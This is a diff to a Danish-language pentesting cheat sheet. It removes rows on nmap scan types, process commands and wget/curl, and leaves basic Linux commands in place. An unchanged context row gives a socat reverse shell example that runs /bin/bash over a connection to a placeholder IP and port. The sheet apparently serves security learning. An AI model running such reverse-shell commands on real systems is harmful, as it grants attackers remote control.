@@ -19,9 +19,7 @@
 | `socat [parametre]`         | Avanceret værktøj til netværksoperationer, tunneling og shells. | Eksempel reverse shell:<br>`socat TCP-L:[port] -` (lyt)<br>`socat TCP:[ip]:[port] EXEC:/bin/bash` (connect til remote shell). |
 | `nmap -sV -sC <ip>`         | Scanner åbne porte, services og udfører standard scripts.                 | `-sV`: Version detection (service/version).<br>`-sC`: Kører standard NSE-scripts.  |
 | `enum4linux <ip>`           | Udfører SMB/Samba enumeration (brugerinfo, shares).                       | Ingen nødvendige flags (standard scan).                       |
-| `nmap -sT MACHINE_IP`       | TCP Connect Scan, udfører fuld TCP-handshake, nemmere at opdage.          | `-sT`: TCP Connect scan.                      |
-| `sudo nmap -sS MACHINE_IP`  | TCP SYN Scan (stealth-scan), hurtigt og mindre synligt for IDS/firewalls. | `-sS`: TCP SYN (stealth scan).                |
-| `sudo nmap -sU MACHINE_IP`  | UDP Scan, scanner for åbne UDP-porte.                                     | `-sU`: UDP Scan. (Langsom scanningstype).     |
+
 
 ## Web Enumeration & Brute Force
 | Kommando | Beskrivelse | Vigtige Flags |
@@ -70,7 +68,7 @@
 | `pwd`                           | Viser nuværende mappe                    | Ingen flags nødvendige                |
 | `cd <mappe>`                    | Skifter mappe                            | Brug `..` for mappe op                |
 | `cat <fil>`                     | Viser indhold af en fil                  | Ingen flags nødvendige                |
-| `nano <fil>`                    | Enkel teksteditor til at redigere filer  | Ingen flags nødvendige                                                                                                                                                                |
+| `nano <fil>`                    | Enkel teksteditor til at redigere filer  | Ingen flags nødvendige                |
 | `touch <fil>`                   | Opretter tom fil                         | Ingen flags nødvendige                |
 | `mkdir <mappe>`                 | Opretter en ny mappe                     | `-p`: opretter mellemmapper           |
 | `rm <fil>`                      | Sletter fil                              | `-r`: rekursivt (mapper)<br>`-f`: tvinger sletning |
@@ -79,12 +77,8 @@
 | `grep <søgetekst> <fil>`        | Søger efter tekst i fil(er)              | `-i`: ignorer store/små bogstaver<br>`-r`: rekursiv søgning |
 | `chmod <rettigheder> <fil>`     | Ændrer filrettigheder                    | Eksempel: `chmod +x fil.sh` (gør fil eksekverbar) |
 | `chown <bruger>:<gruppe> <fil>` | Ændrer ejer og gruppe af fil             | Eksempel: `chown root:root fil.txt`   |
-| `ps aux`                        | Viser aktive processer                   | Ingen flags nødvendige                |
-| `kill <PID>`                    | Dræber en proces (efter ID)              | Eksempel: `kill 1234`                 |
 | `whoami`                        | Viser nuværende brugernavn               | Ingen flags nødvendige                |
 | `ifconfig` eller `ip a`         | Viser netværksinformation                | Ingen flags nødvendige                |
-| `wget <url>`                    | Downloader fil fra URL                   | `-O`: gem fil med bestemt navn        |
-| `curl <url>`                    | Henter data eller filer fra URL          | `-o`: gem data til en fil             |
 | `scp <fil> bruger@host:/sti`    | Kopierer filer over SSH                  | Eksempel: `scp data.txt user@192.168.1.10:/tmp/` |
 
 
